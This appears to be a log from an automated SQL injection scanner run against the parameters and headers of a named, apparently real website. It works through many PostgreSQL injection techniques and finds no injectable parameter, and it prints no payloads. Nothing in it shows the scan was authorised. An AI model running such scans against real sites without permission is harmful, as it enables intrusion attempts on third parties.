[08:28:53] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[08:28:53] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[08:28:55] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[08:28:56] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[08:28:58] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[08:28:58] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[08:29:01] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[08:29:42] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[08:30:15] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[08:31:07] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[08:31:37] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[08:31:37] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[08:31:38] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[08:31:39] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[08:31:40] [INFO] testing 'PostgreSQL inline queries'
[08:31:41] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[08:32:02] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[08:32:32] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[08:33:00] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[08:33:22] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[08:33:36] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[08:34:17] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[08:34:45] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[08:35:15] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[08:35:43] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[08:36:09] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[08:36:54] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[08:37:22] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[08:38:04] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[08:38:32] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[08:38:32] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[08:38:33] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[08:38:34] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[08:38:36] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[08:39:07] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[08:39:45] [WARNING] GET parameter 'MaxCount' does not seem to be injectable
[08:39:45] [WARNING] parameter 'User-Agent' does not appear to be dynamic
[08:39:45] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
[08:39:46] [INFO] testing for SQL injection on parameter 'User-Agent'
[08:39:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[08:40:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[08:41:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[08:42:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[08:42:37] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[08:43:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[08:43:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[08:43:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[08:43:38] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[08:43:39] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[08:43:39] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[08:43:40] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[08:43:41] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[08:43:41] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[08:44:12] [INFO] testing 'Generic inline queries'
[08:44:12] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[08:44:51] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[08:45:27] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[08:45:27] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[08:45:28] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[08:45:29] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[08:45:29] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[08:45:31] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[08:45:32] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[08:45:33] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[08:45:49] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[08:46:05] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[08:46:35] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[08:47:05] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[08:47:06] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[08:47:06] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[08:47:08] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[08:47:09] [INFO] testing 'PostgreSQL inline queries'
[08:47:09] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[08:47:31] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[08:48:02] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[08:48:21] [INFO] parameter 'User-Agent' appears to be 'PostgreSQL stacked queries (heavy query - comment)' injectable
[08:48:21] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[08:48:22] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[08:48:23] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[08:48:23] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[08:48:24] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[08:48:24] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[08:48:25] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[08:48:26] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[08:48:26] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[08:48:27] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[08:48:28] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[08:48:28] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[08:48:29] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[08:48:29] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[08:48:30] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[08:48:31] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[08:48:41] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[08:48:59] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[08:49:09] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[08:49:21] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[08:49:31] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[08:49:48] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[08:50:06] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[08:50:24] [INFO] checking if the injection point on User-Agent parameter 'User-Agent' is a false positive
[08:50:25] [WARNING] false positive or unexploitable injection point detected
[08:50:25] [WARNING] parameter 'User-Agent' does not seem to be injectable
[08:50:25] [WARNING] parameter 'Referer' does not appear to be dynamic
[08:50:25] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
[08:50:26] [INFO] testing for SQL injection on parameter 'Referer'
[08:50:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[08:50:27] [WARNING] reflective value(s) found and filtering out
[08:51:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[08:52:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[08:52:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[08:52:27] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[08:53:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[08:53:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[08:53:46] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[08:53:46] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[08:53:47] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[08:53:47] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[08:53:48] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[08:53:49] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[08:53:49] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[08:54:20] [INFO] testing 'Generic inline queries'
[08:54:20] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[08:54:46] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[08:55:30] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[08:55:30] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[08:55:31] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[08:55:31] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[08:55:32] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[08:55:33] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[08:55:34] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[08:55:36] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[08:55:36] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[08:55:37] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[08:56:01] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[08:56:22] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[08:56:23] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[08:56:23] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[08:56:24] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[08:56:25] [INFO] testing 'PostgreSQL inline queries'
[08:56:26] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[08:56:26] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[08:56:51] [INFO] parameter 'Referer' appears to be 'PostgreSQL > 8.1 stacked queries' injectable
[08:56:51] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[08:56:52] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[08:56:53] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[08:56:53] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[08:56:54] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[08:56:54] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[08:56:55] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[08:56:55] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[08:56:56] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[08:56:56] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[08:56:56] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[08:56:56] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[08:56:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[08:56:57] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[08:56:58] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[08:57:09] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[08:57:35] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[08:57:46] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[08:58:05] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[08:58:16] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[08:58:27] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[08:58:39] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[08:58:58] [INFO] checking if the injection point on Referer parameter 'Referer' is a false positive
[08:58:58] [WARNING] false positive or unexploitable injection point detected
[08:58:58] [WARNING] parameter 'Referer' does not seem to be injectable
[08:58:58] [WARNING] parameter 'Host' does not appear to be dynamic
[08:58:59] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
[08:58:59] [INFO] testing for SQL injection on parameter 'Host'
[08:58:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[08:59:43] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[09:00:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[09:01:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[09:01:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[09:01:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[09:01:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[09:02:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[09:02:38] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[09:02:39] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[09:02:40] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[09:02:40] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[09:02:41] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[09:02:42] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[09:02:57] [INFO] testing 'Generic inline queries'
[09:02:57] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[09:03:23] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[09:04:01] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[09:04:02] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[09:04:03] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[09:04:04] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[09:04:04] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[09:04:06] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[09:04:14] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[09:04:15] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[09:04:16] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[09:04:17] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[09:04:41] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[09:05:16] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[09:05:16] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[09:05:16] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[09:05:17] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[09:05:18] [INFO] testing 'PostgreSQL inline queries'
[09:05:18] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[09:05:18] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[09:05:28] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[09:05:28] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[09:05:44] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[09:05:44] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[09:05:52] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[09:06:10] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[09:06:42] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[09:06:43] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[09:06:43] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[09:06:59] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[09:07:22] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[09:07:23] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[09:07:23] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[09:07:23] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[09:07:24] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[09:07:24] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[09:07:25] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[09:07:59] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[09:08:12] [WARNING] parameter 'Host' does not seem to be injectable
[09:08:12] [ERROR] all tested parameters do not appear to be injectable, skipping to the next target
[09:08:12] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 1 times, 400 (Bad Request) - 938 times
[3/5] URL:
GET https://www.mustso.org.tr/WebResource.axd?d=uI6_Y3mZloGbByzIhKKf1OQePkQCUK_zid-cTvmw3sBFoiiqaEmsYeUFXhxnL2EpZmaRS8DN81BwrVrA0&t=637290871100000000
do you want to test this URL? [Y/n/q]
>

[09:08:12] [INFO] testing URL 'https://www.mustso.org.tr/WebResource.axd?d=uI6_Y3mZloGbByzIhKKf1OQePkQCUK_zid-cTvmw3sBFoiiqaEmsYeUFXhxnL2EpZmaRS8DN81BwrVrA0&t=637290871100000000'
[09:08:12] [INFO] checking if the target is protected by some kind of WAF/IPS
[09:08:13] [INFO] testing if the target URL content is stable
[09:08:13] [INFO] target URL content is stable
[09:08:13] [INFO] testing if GET parameter 'd' is dynamic
[09:08:14] [WARNING] GET parameter 'd' does not appear to be dynamic
[09:08:14] [WARNING] heuristic (basic) test shows that GET parameter 'd' might not be injectable
[09:08:14] [INFO] testing for SQL injection on GET parameter 'd'
[09:08:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[09:09:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[09:10:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[09:11:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[09:11:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[09:12:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[09:12:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[09:12:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[09:12:43] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[09:12:44] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[09:12:51] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[09:12:52] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[09:12:53] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[09:12:53] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[09:13:43] [INFO] testing 'Generic inline queries'
[09:13:43] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[09:14:24] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[09:15:15] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[09:15:16] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[09:15:17] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[09:15:17] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[09:15:18] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[09:15:19] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[09:15:28] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[09:15:29] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[09:16:05] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[09:16:30] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[09:17:15] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[09:17:27] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[09:17:28] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[09:17:28] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[09:17:29] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[09:17:29] [INFO] testing 'PostgreSQL inline queries'
[09:17:29] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[09:17:29] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
[09:17:44] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[09:18:10] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[09:18:24] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[09:18:51] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[09:18:58] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[09:19:11] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[09:19:37] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[09:19:59] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[09:20:24] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[09:20:49] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[09:21:11] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[09:21:43] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[09:21:55] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[09:22:24] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[09:22:25] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[09:22:25] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[09:22:26] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n]

[09:22:26] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[09:22:45] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[09:23:25] [WARNING] GET parameter 'd' does not seem to be injectable
[09:23:25] [INFO] testing if GET parameter 't' is dynamic
[09:23:25] [WARNING] GET parameter 't' does not appear to be dynamic
[09:23:26] [WARNING] heuristic (basic) test shows that GET parameter 't' might not be injectable
[09:23:26] [INFO] testing for SQL injection on GET parameter 't'
[09:23:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[09:24:06] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[09:24:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[09:24:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[09:25:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[09:26:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[09:26:06] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[09:26:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[09:26:29] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[09:26:30] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[09:26:30] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[09:26:30] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[09:26:30] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[09:26:30] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[09:26:43] [INFO] testing 'Generic inline queries'
[09:26:43] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[09:26:57] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[09:27:38] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[09:27:38] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[09:27:38] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[09:27:39] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[09:27:39] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[09:27:40] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[09:27:40] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[09:27:40] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[09:27:55] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[09:28:05] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[09:28:30] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[09:29:14] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[09:29:15] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[09:29:15] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[09:29:16] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[09:29:17] [INFO] testing 'PostgreSQL inline queries'
[09:29:17] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[09:29:47] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[09:30:14] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[09:30:22] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[09:30:57] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[09:31:04] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[09:31:17] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[09:31:41] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[09:32:18] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[09:32:29] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[09:32:48] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[09:33:10] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[09:33:52] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[09:34:18] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[09:34:36] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[09:34:36] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[09:34:36] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[09:34:37] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[09:34:38] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[09:35:23] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[09:35:59] [WARNING] GET parameter 't' does not seem to be injectable
[09:35:59] [INFO] testing if parameter 'User-Agent' is dynamic
[09:35:59] [WARNING] parameter 'User-Agent' does not appear to be dynamic
[09:35:59] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
[09:36:00] [INFO] testing for SQL injection on parameter 'User-Agent'
[09:36:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
